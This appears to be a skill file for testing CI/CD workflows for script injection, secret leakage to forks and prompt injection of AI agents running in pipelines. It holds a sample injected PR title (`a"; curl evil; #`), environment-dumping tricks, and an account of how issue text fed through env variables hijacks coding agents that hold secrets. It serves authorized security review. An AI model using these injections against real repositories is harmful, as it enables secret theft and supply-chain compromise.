---
name: ci_cd_injection
description: Testing CI/CD and GitHub Actions for script injection, pull_request_target, secret leakage to forks, and untrusted input reaching AI agents in pipelines
---

# CI/CD Injection

CI pipelines are privileged confused deputies: they hold cloud keys, can push to `main`, and often run on attacker-controlled events (fork PRs, issue comments, commit messages). Test workflow YAML the same way you test server-side command injection.

This is the coverage-checklist **infrastructure** category when `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, or CircleCI configs are present. Includes **agentic CI**: Claude Code / Codex / Gemini actions that receive issue or PR text while holding `GITHUB_TOKEN` and secrets.

## Attack Surface

**Classic**
- GitHub Actions: `run:`, `${{ }}` expressions, `pull_request_target`, `workflow_run`, `issue_comment`
- Unpinned actions (`@v4` vs SHA), `curl | bash` in setup
- GitLab `CI_COMMIT_MESSAGE` / MR title in scripts; Jenkins `build with parameters`

**Agentic**
- `anthropics/claude-code-action`, `google-github-actions/run-gemini-cli`, Codex/OpenAI inference actions
- Prompts built from `github.event.issue.body`, PR title, review comments
- `env:` blocks that copy event fields into the prompt (no `${{ }}` in the prompt itself)
- Sandbox off: `danger-full-access`, `Bash(*)`, `--yolo`, `allowed_non_write_users: "*"`

## High-Value Targets

- `pull_request_target` + `actions/checkout` of the PR head SHA
- `run: echo ${{ github.event.issue.title }}` (unquoted expression → shell injection)
- Secrets (`NPM_TOKEN`, cloud keys) on `pull_request` from forks
- Issue-comment bots that run an agent with `contents: write` and `id-token: write`
- Reusable workflows / composite actions that hide the AI step

## Reconnaissance

```
.github/workflows/*.yml
.github/actions/**/action.yml
.gitlab-ci.yml  Jenkinsfile  .circleci/config.yml
uses: anthropics/  uses: openai/  uses: google-github-actions/
pull_request_target  issue_comment  workflow_run
permissions:  secrets.
```

Follow `uses: org/repo@ref` and local `./.github/actions/...` so hidden agents are not missed.

## Key Vulnerabilities

### Expression → shell

`${{ github.event.pull_request.title }}` expanded *before* the shell runs. A title of `a"; curl evil; #` executes if interpolated unquoted into `run:`.

Safer pattern: pass via `env:` and quote `"$TITLE"` inside the script so the expression is not concatenated into the shell parse.

### `pull_request_target` + untrusted checkout

The job uses the **base** repo's secrets and a privileged token, then checks out attacker-controlled PR code and runs its tests/linters/actions. That is RCE in CI.

### Env-intermediary agent prompts

YAML looks clean (`prompt: $ISSUE_BODY`) while `env: ISSUE_BODY: ${{ github.event.issue.body }}` feeds attacker text to an agent with tools. Treat as prompt injection with a secrets sink.

### Over-broad agent tools

Even `echo` can become `echo $(env)` / `` echo `printenv` ``. `allowed_tools` is not a security boundary if any tool expands a shell.

### Secret fan-out

- `pull_request` from forks with `secrets: inherit`
- `workflow_run` on a workflow the attacker can trigger, then reading artifacts that contain secrets
- `GITHUB_TOKEN` with `contents: write` on untrusted events → branch protection bypass / malicious commit

## Testing Methodology

1. Inventory workflows, triggers, `permissions`, and secret names
2. Mark untrusted fields: fork PR head, issue/PR title/body, comment, commit message, label, branch name
3. Trace those fields into `run:`, `env:`, action `with:`, and agent prompts
4. For agentic jobs: list tools, sandbox flags, user allowlists
5. Prove impact in an authorized clone/fork workflow (injection into a log, outbound request from the runner) — do not burn live org secrets; redact

## Validation

- Show the data-flow: event field → YAML site → command or model → privileged action
- "Unpinned action" alone is not enough unless you connect it to execution of untrusted code or secret use
- Maintainer-only `workflow_dispatch` with no untrusted input is low signal

## False Positives

- `pull_request` (not `_target`) with read-only token and no secrets
- Expressions passed only as quoted env vars to a script that does not eval them
- Agent actions with no untrusted event fields and a tight allowlist of users

## Impact

- Cloud account takeover (OIDC / static keys in CI)
- Supply-chain commit to the default branch
- Secret exfil via HTTP from the runner or via model tool calls
- Prompt injection that the agent "fixes" by opening a malicious PR that then auto-merges

## Pro Tips

1. The env-intermediary pattern is the one reviewers miss — never grep only for `${{` inside `prompt:`
2. Composite actions under `.github/actions/` are part of the same graph
3. Pair with `agent_mcp_config` when the workflow installs extra MCP servers
4. GitLab/Jenkins analogues: MR title in `script:`, `currentBuild.rawBuild` eval, untrusted library loads
5. File CI findings even on "docs-only" repos if they still have cloud OIDC
